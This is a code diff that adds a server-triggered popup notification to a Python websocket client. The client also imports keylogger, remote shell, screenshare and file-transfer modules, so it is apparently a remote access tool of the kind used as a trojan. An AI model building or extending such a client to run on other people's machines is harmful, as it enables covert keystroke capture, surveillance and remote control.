@@ -7,6 +7,7 @@ import websocket
 import util
 import classes
 import file_transfer
+import notification
 from keylogger import keylogger
 from shell import shell
 from screenshare import screenshare
@@ -78,6 +79,12 @@ def on_message(ws, message):
                 ws.send(json.dumps({"type": "file_download_response", "data": result}))
             except Exception as e:
                 ws.send(json.dumps({"type": "file_transfer_output", "data": f"[Error] Failed to process file download: {e}"}))
+
+        elif msg_type == "notification":
+            notification_data = json.loads(msg_data)
+            message = notification_data.get("message", "")
+            title = notification_data.get("title", "Notification")
+            notification.show_notification(message, title=title)
 
         elif msg_type == "Disconnect":
             print(f"[Info] Received server-initiated disconnect: {msg_data}")
